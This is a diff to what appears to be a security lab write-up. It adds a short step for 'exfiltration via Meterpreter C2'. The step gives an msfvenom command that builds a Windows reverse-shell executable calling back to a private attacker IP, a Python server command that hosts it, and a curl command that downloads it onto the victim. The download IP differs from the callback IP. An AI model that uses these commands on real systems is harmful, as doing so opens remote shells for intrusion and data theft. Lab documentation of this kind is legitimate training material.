@@ -86,3 +86,14 @@ C:\temp\whoami.txt
 
 
 <img width="473" height="554" alt="image" src="https://github.com/user-attachments/assets/61856dc1-3a47-4283-88bd-07389df37dd0" />
+
+## Task 2: Exfiltration via Meterpreter C2
+On our kali machine create the payload and listener: ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.92.136 LPORT=5555 -f exe -o exfil.exe```
+Start server: ```python3 -m http.server 8000```
+
+On Windows download the payload and open it: ```curl.exe http://192.169.92.136:8000/exfil.exe -o C:\temp\exfil.exe```
+
+<img width="1140" height="462" alt="image" src="https://github.com/user-attachments/assets/44fe1b36-557d-4c8c-934e-8b6cc524076b" />
+
+<img width="426" height="189" alt="image" src="https://github.com/user-attachments/assets/83fde88d-a74f-4c74-9ef4-fe09483b55eb" />
+
